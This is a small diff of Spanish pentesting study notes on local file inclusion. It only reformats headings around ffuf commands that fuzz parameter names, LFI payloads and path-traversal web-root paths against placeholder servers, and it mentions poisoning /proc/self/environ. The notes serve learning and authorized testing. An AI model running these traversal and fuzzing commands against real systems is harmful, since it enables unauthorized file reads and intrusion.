@@ -188,11 +188,11 @@ También podemos probar envenenar los proc /proc/self/environ o /proc/self/fd/(N
 
 
 Podemos buscar parámetros con fuff y luego probar con el intruder de burp la lista "SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
-Parametros:
+##### Parametros:
 
                 ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value'
 
-valores:
+##### Valores:
 
                 ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ'
 
@@ -203,6 +203,7 @@ Algunas veces no sabémos cómo llegar a un archivo envenenado que subimos. pode
 determinar el path de de la web:
 
                 ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+                
 Esta lista tiene su par en windows en el mismo directorio.
 
 #### Log paths:
